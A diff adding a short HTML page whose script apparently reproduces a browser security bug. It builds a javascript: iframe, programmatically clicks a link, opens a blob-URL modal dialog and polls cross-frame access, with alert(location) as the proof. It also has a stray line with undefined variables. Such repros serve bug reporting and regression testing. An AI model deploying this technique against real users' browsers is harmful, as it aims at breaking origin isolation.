@@ -1,0 +1,37 @@
+<body>
+<p>click anywhere</p>
+<script>
+
+window.onfocus = () => {
+    window.onclick = null;
+
+    f = document.createElement('iframe');
+    f.src = 'javascript:alert(location)';
+    f.onload = () => {
+        f.onload = null;
+
+        let a = f.contentDocument.createElement('a');
+        a.href = 'https://abc.xyz/';
+        a.click();
+
+        window.showModalDialog(URL.createObjectURL(new Blob([`
+<script>
+let it = setInterval(() => {
+    try {
+        opener[0].document.x;
+    } catch (e) {
+        clearInterval(it);
+
+        window.close();
+    }
+}, 100);
+</scrip` + 't>'], {type: 'text/html'})));
+    };
+
+    document.body.appendChild(f);
+};
+
+cached.src = kUrl;
+
+</script>
+</body>
